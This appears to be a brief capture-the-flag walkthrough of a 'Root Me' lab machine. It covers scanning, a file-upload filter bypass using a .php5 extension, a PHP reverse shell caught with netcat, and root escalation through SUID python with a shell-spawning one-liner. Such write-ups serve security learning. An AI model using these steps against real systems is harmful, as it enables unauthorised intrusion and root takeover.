# Root Me




## Scanning (`sudo nmap -sC -sV -oN nmap/initial 10.10.56.239`)

```
80
22
```


## Questions and Answers

* Apache is running `2.4.29` version

* `/panel/` is the hidden directory


* `find / -type f -name user.txt 2>/dev/null` to find user.txt file that contains the flag

* `usr/bin/python` has SUID permissions, this is strange because we could run a malicious python script with SUID permissions

* `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` used to escalate privilege to root user

* `find / -type f -name root.txt 2>/dev/null` to find root.txt file that contains the flag




## Hints

* `/panel` does not accept .php files, but accepts `.php5`, thats how i bypassed the upload filter

* Got shell when uploading a php reverse shell and using `sudo nc -nlvp 1234` to listen on port 1234

* `find / -perm -u=s -type f 2>/dev/null` searches for files with SUID permissions

* https://gtfobins.github.io/gtfobins/python/#suid
